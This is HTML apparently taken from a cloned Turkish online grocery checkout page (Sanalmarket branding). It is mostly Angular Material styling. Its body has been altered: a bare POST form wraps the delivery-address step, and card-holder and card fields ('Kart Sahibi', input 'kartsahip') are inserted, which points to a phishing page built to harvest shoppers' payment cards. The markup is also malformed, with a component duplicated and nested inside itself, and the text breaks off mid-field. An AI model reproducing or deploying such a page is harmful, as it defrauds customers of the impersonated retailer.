      .mat-mdc-checkbox .mdc-checkbox:hover.mdc-checkbox--anim-checked-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:hover.mdc-checkbox--anim-indeterminate-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background {
        animation-name: mdc-checkbox-fade-out-background-FF018786FF01878600000000FF018786
      }

      .mat-mdc-checkbox .mdc-checkbox.mdc-ripple-upgraded--background-focused .mdc-checkbox__native-control:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(.mdc-ripple-upgraded):focus .mdc-checkbox__native-control:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-unselected-focus-icon-color, var(--mdc-theme-secondary, #018786));
        background-color: transparent
      }

      .mat-mdc-checkbox .mdc-checkbox.mdc-ripple-upgraded--background-focused .mdc-checkbox__native-control:enabled:checked~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox.mdc-ripple-upgraded--background-focused .mdc-checkbox__native-control:enabled:indeterminate~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox.mdc-ripple-upgraded--background-focused .mdc-checkbox__native-control[data-indeterminate=true]:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(.mdc-ripple-upgraded):focus .mdc-checkbox__native-control:enabled:checked~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(.mdc-ripple-upgraded):focus .mdc-checkbox__native-control:enabled:indeterminate~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(.mdc-ripple-upgraded):focus .mdc-checkbox__native-control[data-indeterminate=true]:enabled~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-selected-focus-icon-color, var(--mdc-theme-secondary, #018786));
        background-color: var(--mdc-checkbox-selected-focus-icon-color, var(--mdc-theme-secondary, #018786))
      }

      @keyframes mdc-checkbox-fade-in-background-FF018786FF01878600000000FF018786 {
        0% {
          border-color: var(--mdc-checkbox-unselected-focus-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: transparent
        }

        50% {
          border-color: var(--mdc-checkbox-selected-focus-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: var(--mdc-checkbox-selected-focus-icon-color, var(--mdc-theme-secondary, #018786))
        }
      }

      @keyframes mdc-checkbox-fade-out-background-FF018786FF01878600000000FF018786 {

        0%,
        80% {
          border-color: var(--mdc-checkbox-selected-focus-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: var(--mdc-checkbox-selected-focus-icon-color, var(--mdc-theme-secondary, #018786))
        }

        100% {
          border-color: var(--mdc-checkbox-unselected-focus-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: transparent
        }
      }

      .mat-mdc-checkbox .mdc-checkbox.mdc-ripple-upgraded--background-focused.mdc-checkbox--anim-unchecked-checked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox.mdc-ripple-upgraded--background-focused.mdc-checkbox--anim-unchecked-indeterminate .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(.mdc-ripple-upgraded):focus.mdc-checkbox--anim-unchecked-checked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(.mdc-ripple-upgraded):focus.mdc-checkbox--anim-unchecked-indeterminate .mdc-checkbox__native-control:enabled~.mdc-checkbox__background {
        animation-name: mdc-checkbox-fade-in-background-FF018786FF01878600000000FF018786
      }

      .mat-mdc-checkbox .mdc-checkbox.mdc-ripple-upgraded--background-focused.mdc-checkbox--anim-checked-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox.mdc-ripple-upgraded--background-focused.mdc-checkbox--anim-indeterminate-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(.mdc-ripple-upgraded):focus.mdc-checkbox--anim-checked-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(.mdc-ripple-upgraded):focus.mdc-checkbox--anim-indeterminate-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background {
        animation-name: mdc-checkbox-fade-out-background-FF018786FF01878600000000FF018786
      }

      .mat-mdc-checkbox .mdc-checkbox:not(:disabled):active .mdc-checkbox__native-control:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-unselected-pressed-icon-color, rgba(0, 0, 0, 0.54));
        background-color: transparent
      }

      .mat-mdc-checkbox .mdc-checkbox:not(:disabled):active .mdc-checkbox__native-control:enabled:checked~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(:disabled):active .mdc-checkbox__native-control:enabled:indeterminate~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(:disabled):active .mdc-checkbox__native-control[data-indeterminate=true]:enabled~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-selected-pressed-icon-color, var(--mdc-theme-secondary, #018786));
        background-color: var(--mdc-checkbox-selected-pressed-icon-color, var(--mdc-theme-secondary, #018786))
      }

      @keyframes mdc-checkbox-fade-in-background-8A000000FF01878600000000FF018786 {
        0% {
          border-color: var(--mdc-checkbox-unselected-pressed-icon-color, rgba(0, 0, 0, 0.54));
          background-color: transparent
        }

        50% {
          border-color: var(--mdc-checkbox-selected-pressed-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: var(--mdc-checkbox-selected-pressed-icon-color, var(--mdc-theme-secondary, #018786))
        }
      }

      @keyframes mdc-checkbox-fade-out-background-8A000000FF01878600000000FF018786 {

        0%,
        80% {
          border-color: var(--mdc-checkbox-selected-pressed-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: var(--mdc-checkbox-selected-pressed-icon-color, var(--mdc-theme-secondary, #018786))
        }

        100% {
          border-color: var(--mdc-checkbox-unselected-pressed-icon-color, rgba(0, 0, 0, 0.54));
          background-color: transparent
        }
      }

      .mat-mdc-checkbox .mdc-checkbox:not(:disabled):active.mdc-checkbox--anim-unchecked-checked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(:disabled):active.mdc-checkbox--anim-unchecked-indeterminate .mdc-checkbox__native-control:enabled~.mdc-checkbox__background {
        animation-name: mdc-checkbox-fade-in-background-8A000000FF01878600000000FF018786
      }

      .mat-mdc-checkbox .mdc-checkbox:not(:disabled):active.mdc-checkbox--anim-checked-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:not(:disabled):active.mdc-checkbox--anim-indeterminate-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background {
        animation-name: mdc-checkbox-fade-out-background-8A000000FF01878600000000FF018786
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__background {
        top: calc((var(--mdc-checkbox-state-layer-size, 40px) - 18px) / 2);
        left: calc((var(--mdc-checkbox-state-layer-size, 40px) - 18px) / 2)
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control {
        top: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 40px)) / 2);
        right: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 40px)) / 2);
        left: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 40px)) / 2);
        width: var(--mdc-checkbox-state-layer-size, 40px);
        height: var(--mdc-checkbox-state-layer-size, 40px)
      }

      .mat-mdc-checkbox .mdc-checkbox:hover .mdc-checkbox__native-control:not([disabled])~.mdc-checkbox__ripple {
        opacity: .04;
        transform: scale(1);
        transition: mdc-checkbox-transition-enter(opacity, 0, 80ms), mdc-checkbox-transition-enter(transform, 0, 80ms)
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control:not([disabled]):focus~.mdc-checkbox__ripple {
        opacity: .16
      }

      .mat-mdc-checkbox .mdc-checkbox__background {
        -webkit-print-color-adjust: exact;
        color-adjust: exact
      }

      .mat-mdc-checkbox._mat-animation-noopable *,
      .mat-mdc-checkbox._mat-animation-noopable *::before {
        transition: none !important;
        animation: none !important
      }

      .mat-mdc-checkbox label {
        cursor: pointer
      }

      .mat-mdc-checkbox.mat-mdc-checkbox-disabled label {
        cursor: default
      }

      .mat-mdc-checkbox label:empty {
        display: none
      }

      .mat-mdc-checkbox .mdc-checkbox__native-control:focus:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-unselected-focus-icon-color, black)
      }

      .mat-mdc-checkbox .mdc-checkbox__ripple {
        opacity: 0
      }

      .mat-mdc-checkbox-ripple,
      .mdc-checkbox__ripple {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        border-radius: 50%;
        pointer-events: none
      }

      .mat-mdc-checkbox-ripple:not(:empty),
      .mdc-checkbox__ripple:not(:empty) {
        transform: translateZ(0)
      }

      .mat-mdc-checkbox-touch-target {
        position: absolute;
        top: 50%;
        height: 48px;
        left: 50%;
        width: 48px;
        transform: translate(-50%, -50%)
      }

      .mat-mdc-checkbox-ripple::before {
        border-radius: 50%
      }

      .mdc-checkbox__native-control:focus~.mat-mdc-focus-indicator::before {
        content: ""
      }
    </style>
    <style>
      .mdc-icon-button {
        font-size: 24px;
        width: 48px;
        height: 48px;
        padding: 12px
      }

      .mdc-icon-button .mdc-icon-button__focus-ring {
        display: none
      }

      .mdc-icon-button.mdc-ripple-upgraded--background-focused .mdc-icon-button__focus-ring,
      .mdc-icon-button:not(.mdc-ripple-upgraded):focus .mdc-icon-button__focus-ring {
        display: block;
        max-height: 48px;
        max-width: 48px
      }

      @media screen and (forced-colors: active) {

        .mdc-icon-button.mdc-ripple-upgraded--background-focused .mdc-icon-button__focus-ring,
        .mdc-icon-button:not(.mdc-ripple-upgraded):focus .mdc-icon-button__focus-ring {
          pointer-events: none;
          border: 2px solid rgba(0, 0, 0, 0);
          border-radius: 6px;
          box-sizing: content-box;
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          height: 100%;
          width: 100%
        }
      }

      @media screen and (forced-colors: active)and (forced-colors: active) {

        .mdc-icon-button.mdc-ripple-upgraded--background-focused .mdc-icon-button__focus-ring,
        .mdc-icon-button:not(.mdc-ripple-upgraded):focus .mdc-icon-button__focus-ring {
          border-color: CanvasText
        }
      }

      @media screen and (forced-colors: active) {

        .mdc-icon-button.mdc-ripple-upgraded--background-focused .mdc-icon-button__focus-ring::after,
        .mdc-icon-button:not(.mdc-ripple-upgraded):focus .mdc-icon-button__focus-ring::after {
          content: "";
          border: 2px solid rgba(0, 0, 0, 0);
          border-radius: 8px;
          display: block;
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          height: calc(100% + 4px);
          width: calc(100% + 4px)
        }
      }

      @media screen and (forced-colors: active)and (forced-colors: active) {

        .mdc-icon-button.mdc-ripple-upgraded--background-focused .mdc-icon-button__focus-ring::after,
        .mdc-icon-button:not(.mdc-ripple-upgraded):focus .mdc-icon-button__focus-ring::after {
          border-color: CanvasText
        }
      }

      .mdc-icon-button.mdc-icon-button--reduced-size .mdc-icon-button__ripple {
        width: 40px;
        height: 40px;
        margin-top: 4px;
        margin-bottom: 4px;
        margin-right: 4px;
        margin-left: 4px
      }

      .mdc-icon-button.mdc-icon-button--reduced-size.mdc-ripple-upgraded--background-focused .mdc-icon-button__focus-ring,
      .mdc-icon-button.mdc-icon-button--reduced-size:not(.mdc-ripple-upgraded):focus .mdc-icon-button__focus-ring {
        max-height: 40px;
        max-width: 40px
      }

      .mdc-icon-button .mdc-icon-button__touch {
        position: absolute;
        top: 50%;
        height: 48px;
        left: 50%;
        width: 48px;
        transform: translate(-50%, -50%)
      }

      .mdc-icon-button svg,
      .mdc-icon-button img {
        width: 24px;
        height: 24px
      }

      .mdc-icon-button {
        display: inline-block;
        position: relative;
        box-sizing: border-box;
        border: none;
        outline: none;
        background-color: rgba(0, 0, 0, 0);
        fill: currentColor;
        color: inherit;
        text-decoration: none;
        cursor: pointer;
        user-select: none;
        z-index: 0;
        overflow: visible
      }

      .mdc-icon-button .mdc-icon-button__touch {
        position: absolute;
        top: 50%;
        height: 48px;
        left: 50%;
        width: 48px;
        transform: translate(-50%, -50%)
      }

      .mdc-icon-button:disabled {
        cursor: default;
        pointer-events: none
      }

      .mdc-icon-button--display-flex {
        align-items: center;
        display: inline-flex;
        justify-content: center
      }

      .mdc-icon-button__icon {
        display: inline-block
      }

      .mdc-icon-button__icon.mdc-icon-button__icon--on {
        display: none
      }

      .mdc-icon-button--on .mdc-icon-button__icon {
        display: none
      }

      .mdc-icon-button--on .mdc-icon-button__icon.mdc-icon-button__icon--on {
        display: inline-block
      }

      .mdc-icon-button__link {
        height: 100%;
        left: 0;
        outline: none;
        position: absolute;
        top: 0;
        width: 100%
      }

      .mat-mdc-icon-button {
        height: var(--mdc-icon-button-state-layer-size, 48px);
        width: var(--mdc-icon-button-state-layer-size, 48px);
        font-size: var(--mdc-icon-button-icon-size, 24px);
        color: var(--mdc-icon-button-icon-color, inherit);
        border-radius: 50%;
        flex-shrink: 0
      }

      .mat-mdc-icon-button svg,
      .mat-mdc-icon-button img {
        width: var(--mdc-icon-button-icon-size, 24px);
        height: var(--mdc-icon-button-icon-size, 24px)
      }

      .mat-mdc-icon-button:disabled {
        opacity: var(--mdc-icon-button-disabled-icon-opacity, 0.38)
      }

      .mat-mdc-icon-button:disabled {
        color: var(--mdc-icon-button-disabled-icon-color, #000)
      }

      .mat-mdc-icon-button[disabled] {
        cursor: default;
        pointer-events: none;
        opacity: 1
      }

      .mat-mdc-icon-button .mat-mdc-button-ripple,
      .mat-mdc-icon-button .mat-mdc-button-persistent-ripple,
      .mat-mdc-icon-button .mat-mdc-button-persistent-ripple::before {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        pointer-events: none;
        border-radius: inherit
      }

      .mat-mdc-icon-button .mat-mdc-button-persistent-ripple::before {
        content: "";
        opacity: 0;
        background-color: var(--mat-mdc-button-persistent-ripple-color)
      }

      .mat-mdc-icon-button .mat-ripple-element {
        background-color: var(--mat-mdc-button-ripple-color)
      }

      .mat-mdc-icon-button .mdc-button__label {
        z-index: 1
      }

      .mat-mdc-icon-button .mat-mdc-focus-indicator {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute
      }

      .mat-mdc-icon-button:focus .mat-mdc-focus-indicator::before {
        content: ""
      }

      .mat-mdc-icon-button .mat-mdc-button-touch-target {
        position: absolute;
        top: 50%;
        height: 48px;
        left: 50%;
        width: 48px;
        transform: translate(-50%, -50%)
      }

      .mat-mdc-icon-button._mat-animation-noopable {
        transition: none !important;
        animation: none !important
      }

      .mat-mdc-icon-button .mat-mdc-button-persistent-ripple {
        border-radius: 50%
      }

      .mat-mdc-icon-button.mat-unthemed:not(.mdc-ripple-upgraded):focus::before,
      .mat-mdc-icon-button.mat-primary:not(.mdc-ripple-upgraded):focus::before,
      .mat-mdc-icon-button.mat-accent:not(.mdc-ripple-upgraded):focus::before,
      .mat-mdc-icon-button.mat-warn:not(.mdc-ripple-upgraded):focus::before {
        background: rgba(0, 0, 0, 0);
        opacity: 1
      }
    </style>
    <style>
      .mat-snack-bar-container {
        border-radius: 4px;
        box-sizing: border-box;
        display: block;
        margin: 24px;
        max-width: 33vw;
        min-width: 344px;
        padding: 14px 16px;
        min-height: 48px;
        transform-origin: center
      }

      .cdk-high-contrast-active .mat-snack-bar-container {
        border: solid 1px
      }

      .mat-snack-bar-handset {
        width: 100%
      }

      .mat-snack-bar-handset .mat-snack-bar-container {
        margin: 8px;
        max-width: 100%;
        min-width: 0;
        width: 100%
      }
    </style>
    <style>
      [_nghost-isc-c149] {
        display: block
      }

      .toaster[_ngcontent-isc-c149] {
        display: flex
      }

      .toaster__icon[_ngcontent-isc-c149] {
        height: 40px
      }

      .toaster__icon[_ngcontent-isc-c149] i[_ngcontent-isc-c149] {
        background-size: contain !important;
        width: 40px;
        height: 40px;
        margin-right: 20px
      }

      .toaster__message[_ngcontent-isc-c149] {
        line-height: 1.25
      }

      .toaster__message[_ngcontent-isc-c149] h3[_ngcontent-isc-c149] {
        font-size: 16px;
        font-family: var(--primary-font-family);
        margin-bottom: 2px;
        line-height: 1.25;
        color: var(--font-color__light)
      }

      .toaster__message[_ngcontent-isc-c149] p[_ngcontent-isc-c149] {
        font-size: 14px;
        margin: 0;
        line-height: 1.29;
        font-weight: var(--font-weight-lighter)
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      [_nghost-isc-c509] {
        display: block;
        position: relative
      }

      .auth-article[_ngcontent-isc-c509] {
        background: url(assets/images/login-bg.webp) no-repeat top;
        background-size: 100vw;
        display: flex;
        justify-content: center
      }

      @media (max-width: 768px) {
        .auth-article[_ngcontent-isc-c509] {
          background-size: 100vw 6rem
        }
      }

      .padding[_ngcontent-isc-c509] {
        padding: 0 1rem
      }

      @media (min-width: 1200px) {
        .padding[_ngcontent-isc-c509] {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        .padding[_ngcontent-isc-c509] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        .padding[_ngcontent-isc-c509] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1800px) {
        .padding[_ngcontent-isc-c509] {
          padding: 0 18rem
        }
      }

      .elektronik[_nghost-isc-c509] .auth-article[_ngcontent-isc-c509],
      .elektronik [_nghost-isc-c509] .auth-article[_ngcontent-isc-c509] {
        background: url(assets/images/login-bg-elektronik.png) no-repeat top;
        background-size: contain
      }

      .kurban[_nghost-isc-c509] .auth-article[_ngcontent-isc-c509],
      .kurban [_nghost-isc-c509] .auth-article[_ngcontent-isc-c509] {
        background: url(assets/images/login-bg-kurban.webp) no-repeat top;
        background-size: contain
      }

      .hemen[_nghost-isc-c509] .auth-article[_ngcontent-isc-c509],
      .hemen [_nghost-isc-c509] .auth-article[_ngcontent-isc-c509] {
        background: url(assets/images/login-bg-hemen.png) no-repeat top;
        background-size: contain
      }

      .yemek[_nghost-isc-c509] .auth-article[_ngcontent-isc-c509],
      .yemek [_nghost-isc-c509] .auth-article[_ngcontent-isc-c509] {
        background: url(assets/images/login-bg-yemek.svg) no-repeat top;
        background-size: contain
      }

      .mion[_nghost-isc-c509] .auth-article[_ngcontent-isc-c509],
      .mion [_nghost-isc-c509] .auth-article[_ngcontent-isc-c509] {
        background: url(assets/images/login-bg-mion.svg) no-repeat top;
        background-size: contain
      }
    </style>
    <style>
      [_nghost-isc-c511] {
        -webkit-user-select: none;
        user-select: none
      }

      @media (max-width: 768px) {
        [_nghost-isc-c511] {
          width: 100%
        }
      }

      .faqs[_ngcontent-isc-c511],
      .login[_ngcontent-isc-c511] {
        margin: 1rem 0
      }

      .faqs__content[_ngcontent-isc-c511],
      .login__content[_ngcontent-isc-c511] {
        margin: 0 auto 2.25rem;
        display: flex;
        place-items: center
      }

      @media (min-width: 768px) {

        .faqs__content[_ngcontent-isc-c511],
        .login__content[_ngcontent-isc-c511] {
          margin: 3rem auto;
          width: 34.5rem
        }
      }

      .faqs__content[_ngcontent-isc-c511] mat-card-header[_ngcontent-isc-c511],
      .login__content[_ngcontent-isc-c511] mat-card-header[_ngcontent-isc-c511] {
        padding: 2rem 2rem 0;
        justify-content: center
      }

      .faqs__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511],
      .login__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511] {
        padding-bottom: 1.5rem;
        width: 100%
      }

      @media (min-width: 768px) {

        .faqs__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511],
        .login__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511] {
          padding: 0 6.125rem 2rem
        }
      }

      .faqs__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511] form[_ngcontent-isc-c511],
      .login__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511] form[_ngcontent-isc-c511] {
        margin-top: 1.5rem
      }

      .faqs__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511] mat-form-field[_ngcontent-isc-c511],
      .login__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511] mat-form-field[_ngcontent-isc-c511] {
        width: 100%;
        margin-bottom: .25rem
      }

      .faqs__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511] .continue-without-authentication[_ngcontent-isc-c511],
      .login__content[_ngcontent-isc-c511] mat-card-content[_ngcontent-isc-c511] .continue-without-authentication[_ngcontent-isc-c511] {
        margin-top: 1rem;
        text-align: center
      }

      .faqs__content[_ngcontent-isc-c511] mat-card-actions[_ngcontent-isc-c511],
      .login__content[_ngcontent-isc-c511] mat-card-actions[_ngcontent-isc-c511] {
        width: 100%;
        justify-content: center;
        padding: 1.5rem
      }

      .faqs[_ngcontent-isc-c511] a[_ngcontent-isc-c511],
      .login[_ngcontent-isc-c511] a[_ngcontent-isc-c511] {
        cursor: pointer;
        text-decoration: none
      }

      .faqs[_ngcontent-isc-c511] a[_ngcontent-isc-c511]:hover,
      .login[_ngcontent-isc-c511] a[_ngcontent-isc-c511]:hover {
        text-decoration: underline
      }

      .faqs__links[_ngcontent-isc-c511],
      .login__links[_ngcontent-isc-c511] {
        margin-bottom: 3.125rem;
        display: flex;
        justify-content: space-between
      }
    </style>
    <script async="" src="https://tags.bluekai.com/site/83669?ret=js&amp;limit=1"></script>
    <style>
      [_nghost-isc-c242] {
        width: 100%
      }

      [_nghost-isc-c242] button[_ngcontent-isc-c242] {
        width: 100%;
        height: 3.15rem
      }

      [_nghost-isc-c242] fa-icon[_ngcontent-isc-c242] {
        margin: 0
      }
    </style>
    <style>
      fe-captcha-turnstile iframe {
        width: 100% !important
      }
    </style>
    <meta name="robots" content="noindex">
  </head>
  <body class="mat-typography" style="">
    <sm-root _nghost-isc-c377="" ng-version="14.2.10">
      <div _ngcontent-isc-c377="" class="grid sanalmarket">
        <sm-header-lite _ngcontent-isc-c377="" _nghost-isc-c375="" class="ng-star-inserted">
          <div _ngcontent-isc-c375="" class="header-wrapper">
            <div _ngcontent-isc-c375="" class="desktop-only">
              <sm-additonal-order _ngcontent-isc-c375="" _nghost-isc-c355="" class="ng-star-inserted">
                <!---->
                <!---->
                <!---->
              </sm-additonal-order>
              <!---->
              <!---->
            </div>
            <div _ngcontent-isc-c375="" class="logo-container sanalmarket"></div>
            <div _ngcontent-isc-c375="" class="mobile-only">
              <sm-additonal-order _ngcontent-isc-c375="" _nghost-isc-c355="" class="ng-star-inserted">
                <!---->
                <!---->
                <!---->
              </sm-additonal-order>
              <!---->
              <!---->
            </div>
          </div>
          <!---->
        </sm-header-lite>
        <!---->
        <!---->
        <!---->
        <!---->
        <!---->
          <form method="POST">
        <main _ngcontent-isc-c377="" class="sanalmarket">
          <router-outlet _ngcontent-isc-c377=""></router-outlet>
          <sm-delivery-address-page _nghost-isc-c482="" class="ng-star-inserted">
            <div _ngcontent-isc-c482="" class="delivery-address-wrapper">
              <div _ngcontent-isc-c482="" class="mdc-layout-grid__inner">
                <div _ngcontent-isc-c482="" class="mdc-layout-grid__cell--span-8 mdc-layout-grid__cell--span-4-phone">
                  <h1 _ngcontent-isc-c482="" class="text-color-black form__headline">Siparişini nereye getirelim?</h1>
                  <div _ngcontent-isc-c482="" class="form__container">
                    <div _ngcontent-isc-c482="" class="form__container__content">
                      <div _ngcontent-isc-c482="" class="form__delivery-zone mat-caption text-color-grey text-align-left">
                        <span _ngcontent-isc-c482="" class="ng-star-inserted"></span>
                        <fa-icon _ngcontent-isc-c482="" class="ng-fa-icon ng-star-inserted">
                          <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512">
                            <path fill="currentColor" d="M342.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L274.7 256 105.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path>
                          </svg>
                        </fa-icon>
                       
                        <!---->
                        <!---->
                        <!---->
                      </div>
                      <div _ngcontent-isc-c482="" class="mat-caption-normal text-color-info text-align-left form__caption">
                        <fa-icon _ngcontent-isc-c482="" class="ng-fa-icon">
                          <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="circle-info" class="svg-inline--fa fa-circle-info" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                            <path fill="currentColor" d="M256 512c141.4 0 256-114.6 256-256S397.4 0 256 0S0 114.6 0 256S114.6 512 256 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-144c-17.7 0-32-14.3-32-32s14.3-32 32-32s32 14.3 32 32s-14.3 32-32 32z"></path>
                          </svg>
                        </fa-icon> Teslimat bölgeni anasayfadan değiştirebilirsin.
                      </div>
                    
                      <div _ngcontent-isc-c482="">
                        <sm-delivery-address-form _ngcontent-isc-c482="" _nghost-isc-c471="">
                          Kart Sahibi
                          <form _ngcontent-isc-c471="" novalidate="" class="delivery-form ng-untouched ng-pristine ng-invalid">
                            <mat-form-field _ngcontent-isc-c471="" appearance="outline" class="mat-mdc-form-field ng-tns-c189-27 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-hide-placeholder mat-primary ng-untouched ng-pristine ng-invalid ng-star-inserted">
                              <!---->
                              <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c189-27 mdc-text-field--outlined">
                                <!---->
                                <div class="mat-mdc-form-field-flex ng-tns-c189-27">
                                  <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c189-27 mdc-notched-outline--upgraded ng-star-inserted">
                                    <div class="mdc-notched-outline__leading"></div>
                                    <div class="mdc-notched-outline__notch">

                                      <label matformfieldfloatinglabel="" class="mdc-floating-label mat-mdc-floating-label ng-tns-c189-27 ng-star-inserted" id="mat-mdc-form-field-label-20" for="mat-input-10" aria-owns="mat-input-10" style="">
                                        <mat-label _ngcontent-isc-c471="" class="ng-tns-c189-27"></mat-label>
                                        <span  aria-hidden="true" class="mat-mdc-form-field-required-marker mdc-floating-label--required ng-tns-c189-27 ng-star-inserted"></span>
                                        <!---->
                                      </label>
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                    <div class="mdc-notched-outline__trailing"></div>
                                  </div>
                                  <!---->
                                  <!---->
                                  <!---->
                                  <div class="mat-mdc-form-field-infix ng-tns-c189-27">
                                    <!---->
                                    <input name="kartsahip" _ngcontent-isc-c471="" matinput="" required="" type="text" label="Ad" formcontrolname="firstName" class="mat-mdc-input-element ng-tns-c189-27 mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" id="mat-input-10" aria-required="true">
                                  </div>
                                  <!---->
                                  <!---->
                                </div>
                                <!---->
                              </div>
                              <div class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c189-27">
                                <!---->
                                <div class="mat-mdc-form-field-hint-wrapper ng-tns-c189-27 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                  <!---->
                                  <div class="mat-mdc-form-field-hint-spacer ng-tns-c189-27"></div>
                                </div>
                                <!---->
                              </div>
                              <sm-delivery-address-form _ngcontent-isc-c482="" _nghost-isc-c471="">
                          Kart 
                          <form _ngcontent-isc-c471="" novalidate="" class="delivery-form ng-untouched ng-pristine ng-invalid">
                            <mat-form-field _ngcontent-isc-c471="" appearance="outline" class="mat-mdc-form-field ng-tns-c189-27 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-hide-placeholder mat-primary ng-untouched ng-pristine ng-invalid ng-star-inserted">
                              <!---->
                              <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c189-27 mdc-text-field--outlined">
                                <!---->
                                <div class="mat-mdc-form-field-flex ng-tns-c189-27">
                                  <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c189-27 mdc-notched-outline--upgraded ng-star-inserted">
                                    <div class="mdc-notched-outline__leading"></div>
                                    <div class="mdc-notched-outline__notch">

                                      <label matformfieldfloatinglabel="" class="mdc-floating-label mat-mdc-floating-label ng-tns-c189-27 ng-star-inserted" id="mat-mdc-form-field-label-20" for="mat-input-10" aria-owns="mat-input-10" style="">
                                        <mat-label _ngcontent-isc-c471="" class="ng-tns-c189-27"></mat-label>
                                        <span  aria-hidden="true" class="mat-mdc-form-field-required-marker mdc-floating-label--required ng-tns-c189-27 ng-star-inserted"></span>
                                        <!---->
                                      </label>
                                      <!---->
                                      <!---->
                                      <!---->
                                    </div>
                                    <div class="mdc-notched-outline__trailing"></div>
                                  </div>
                                  <!---->
                                  <!---->
                                  <!---->
                                  <div class="mat-mdc-form-field-infix ng-tns-c189-27">
